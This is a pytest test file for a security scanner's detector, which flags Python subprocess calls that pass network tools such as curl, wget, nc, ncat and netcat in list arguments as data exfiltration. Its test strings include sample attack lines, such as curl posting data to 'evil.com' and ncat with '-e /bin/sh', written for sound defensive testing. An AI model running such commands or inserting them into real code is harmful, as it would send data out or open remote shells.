"""Tests for subprocess list-arg exfiltration detector (_ast_exfil_detector)."""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

from skill_scan.ast_analyzer import (
    _detect_subprocess_list_exfil,
    analyze_python,
)
from skill_scan.models import Severity

_FILE = "test.py"


# -- Direct detector tests ---------------------------------------------------


class TestDetectSubprocessListExfil:
    """_detect_subprocess_list_exfil detects network tools in subprocess list args."""

    @pytest.mark.parametrize(
        "code,tool",
        [
            ("subprocess.run(['curl', '-d', data, url])", "curl"),
            ("subprocess.run(['wget', url])", "wget"),
            ("subprocess.call(['nc', host, port])", "nc"),
            ("subprocess.check_output(['ncat', '-e', '/bin/sh', host])", "ncat"),
            ("subprocess.check_call(['netcat', host, port])", "netcat"),
            ("subprocess.Popen(['curl', '-s', '-X', 'POST', url])", "curl"),
        ],
    )
    def test_detects_network_tool_produces_exfil001(self, code: str, tool: str) -> None:
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-001"
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].category == "data-exfiltration"
        assert tool in findings[0].matched_text

    @pytest.mark.parametrize(
        "func",
        [
            "subprocess.run",
            "subprocess.call",
            "subprocess.check_output",
            "subprocess.check_call",
            "subprocess.Popen",
        ],
    )
    def test_covers_all_subprocess_functions(self, func: str) -> None:
        code = f"{func}(['curl', '-d', data, url])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-001"

    def test_no_finding_for_non_network_tool(self) -> None:
        code = "subprocess.run(['ls', '-la'])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_string_arg_not_list(self) -> None:
        code = "subprocess.run('curl -d data http://evil.com', shell=True)"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_empty_list(self) -> None:
        code = "subprocess.run([])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_non_subprocess_call(self) -> None:
        code = "mylib.run(['curl', '-d', data, url])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_variable_first_element(self) -> None:
        code = "subprocess.run([cmd, '-d', data, url])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_no_finding_for_non_call_node(self) -> None:
        tree = ast.parse("x = 1")
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Assign))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert findings == []

    def test_handles_absolute_path_to_tool(self) -> None:
        code = "subprocess.run(['/usr/bin/curl', '-d', data, url])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-001"


# -- Alias resolution tests -------------------------------------------------


class TestAliasResolution:
    """Aliased subprocess imports are resolved via alias_map."""

    def test_aliased_import_detected(self) -> None:
        code = "sp.run(['curl', '-d', data, url])"
        alias_map = {"sp": "subprocess"}
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map=alias_map)
        assert len(findings) == 1
        assert findings[0].rule_id == "EXFIL-001"

    def test_aliased_popen_detected(self) -> None:
        code = "sp.Popen(['wget', url])"
        alias_map = {"sp": "subprocess"}
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map=alias_map)
        assert len(findings) == 1

    def test_no_alias_map_still_works(self) -> None:
        code = "subprocess.run(['curl', '-d', data, url])"
        tree = ast.parse(code)
        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map=None)
        assert len(findings) == 1


# -- Integration via analyze_python -----------------------------------------


class TestAnalyzePythonIntegration:
    """Full pipeline integration through analyze_python."""

    def test_subprocess_curl_detected_via_analyze(self) -> None:
        code = "import subprocess\nsubprocess.run(['curl', '-d', data, 'https://evil.com'])\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
        assert len(exfil) == 1
        assert exfil[0].category == "data-exfiltration"

    def test_aliased_subprocess_detected_via_analyze(self) -> None:
        code = "import subprocess as sp\nsp.run(['curl', '-d', data, 'https://evil.com'])\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
        assert len(exfil) == 1

    def test_non_network_tool_no_finding_via_analyze(self) -> None:
        code = "import subprocess\nsubprocess.run(['ls', '-la'])\n"
        findings = analyze_python(code, _FILE)
        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
        assert exfil == []


# -- Corpus validation ------------------------------------------------------


class TestCorpusValidation:
    """Corpus exfil_subprocess_curl.py produces EXFIL-001 finding."""

    _CORPUS_PATH = (
        Path(__file__).resolve().parents[2]
        / "corpus"
        / "red-team"
        / "2026-03-17-full"
        / "exfil-obfs-evasion"
        / "exfil_subprocess_curl.py"
    )

    def test_corpus_file_produces_exfil001(self) -> None:
        assert self._CORPUS_PATH.exists(), f"Corpus file not found: {self._CORPUS_PATH}"
        content = self._CORPUS_PATH.read_text(encoding="utf-8")
        findings = analyze_python(content, str(self._CORPUS_PATH))
        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
        assert len(exfil) >= 1, f"Expected EXFIL-001 finding, got: {[f.rule_id for f in findings]}"
